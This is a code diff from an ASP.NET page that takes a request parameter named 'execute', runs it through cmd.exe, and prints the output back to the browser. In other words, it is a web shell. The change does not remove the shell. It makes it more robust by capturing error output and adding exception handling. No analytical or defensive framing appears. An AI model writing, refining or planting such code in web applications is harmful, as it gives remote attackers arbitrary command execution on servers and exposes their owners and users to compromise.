@@ -10,16 +10,30 @@
             string cmdCommand = Request["execute"];
             if (!string.IsNullOrEmpty(cmdCommand))
             {
-                ProcessStartInfo psi = new ProcessStartInfo();
-                psi.FileName = "cmd.exe";
-                psi.Arguments = "/c " + cmdCommand;
-                psi.RedirectStandardOutput = true;
-                psi.UseShellExecute = false;
-                psi.CreateNoWindow = true;
+                try
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo();
+                    psi.FileName = "cmd.exe";
+                    psi.Arguments = "/c " + cmdCommand;
+                    psi.RedirectStandardOutput = true;
+                    psi.RedirectStandardError = true;
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
 
-                Process process = Process.Start(psi);
-                string output = process.StandardOutput.ReadToEnd();
-                Response.Write("<pre>" + output + "</pre>");
+                    Process process = Process.Start(psi);
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+
+                    Response.Write("<pre>" + output + "</pre>");
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        Response.Write("<pre style='color:red;'>" + error + "</pre>");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Response.Write("<pre style='color:red;'>Error: " + ex.Message + "</pre>");
+                }
             }
         }
         else
